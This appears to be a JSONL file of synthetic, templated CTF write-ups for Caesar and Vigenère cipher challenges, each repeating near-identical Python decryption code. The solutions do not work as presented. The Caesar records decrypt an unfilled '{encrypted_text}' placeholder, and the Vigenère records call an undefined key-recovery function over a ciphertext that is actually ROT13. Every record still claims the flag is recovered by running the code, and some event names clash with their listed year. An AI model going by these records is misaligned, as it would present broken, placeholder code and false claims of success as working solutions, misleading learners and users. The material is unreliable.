"file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832890", "synthetic": true}
{"id": "synthetic_classical_070", "team": "synthetic_team_1", "event": "CTF_2024_Event_15", "challenge_name": "Caesar Cipher #71", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/70", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832902", "synthetic": true}
{"id": "synthetic_classical_071", "team": "synthetic_team_7", "event": "CTF_2024_Event_15", "challenge_name": "Vigenère Cipher #72", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/71", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832919", "synthetic": true}
{"id": "synthetic_classical_072", "team": "synthetic_team_7", "event": "CTF_2024_Event_14", "challenge_name": "Vigenère Cipher #73", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/72", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832934", "synthetic": true}
{"id": "synthetic_classical_073", "team": "synthetic_team_6", "event": "CTF_2024_Event_9", "challenge_name": "Caesar Cipher #74", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/73", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832944", "synthetic": true}
{"id": "synthetic_classical_074", "team": "synthetic_team_1", "event": "CTF_2024_Event_2", "challenge_name": "Vigenère Cipher #75", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/74", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832958", "synthetic": true}
{"id": "synthetic_classical_075", "team": "synthetic_team_2", "event": "CTF_2024_Event_8", "challenge_name": "Vigenère Cipher #76", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/75", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832977", "synthetic": true}
{"id": "synthetic_classical_076", "team": "synthetic_team_5", "event": "CTF_2024_Event_1", "challenge_name": "Vigenère Cipher #77", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/76", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832992", "synthetic": true}
{"id": "synthetic_classical_077", "team": "synthetic_team_3", "event": "CTF_2024_Event_19", "challenge_name": "Vigenère Cipher #78", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/77", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833006", "synthetic": true}
{"id": "synthetic_classical_078", "team": "synthetic_team_7", "event": "CTF_2024_Event_4", "challenge_name": "Caesar Cipher #79", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/78", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833017", "synthetic": true}
{"id": "synthetic_classical_079", "team": "synthetic_team_9", "event": "CTF_2024_Event_1", "challenge_name": "Caesar Cipher #80", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/79", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833027", "synthetic": true}
{"id": "synthetic_classical_080", "team": "synthetic_team_5", "event": "CTF_2024_Event_5", "challenge_name": "Vigenère Cipher #81", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/80", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833046", "synthetic": true}
{"id": "synthetic_classical_081", "team": "synthetic_team_1", "event": "CTF_2024_Event_9", "challenge_name": "Caesar Cipher #82", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/81", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833056", "synthetic": true}
{"id": "synthetic_classical_082", "team": "synthetic_team_9", "event": "CTF_2024_Event_20", "challenge_name": "Caesar Cipher #83", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/82", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833066", "synthetic": true}
{"id": "synthetic_classical_083", "team": "synthetic_team_6", "event": "CTF_2024_Event_13", "challenge_name": "Caesar Cipher #84", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/83", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833076", "synthetic": true}
{"id": "synthetic_classical_084", "team": "synthetic_team_3", "event": "CTF_2024_Event_19", "challenge_name": "Vigenère Cipher #85", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/84", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833091", "synthetic": true}
{"id": "synthetic_classical_085", "team": "synthetic_team_3", "event": "CTF_2024_Event_5", "challenge_name": "Caesar Cipher #86", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/85", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833101", "synthetic": true}
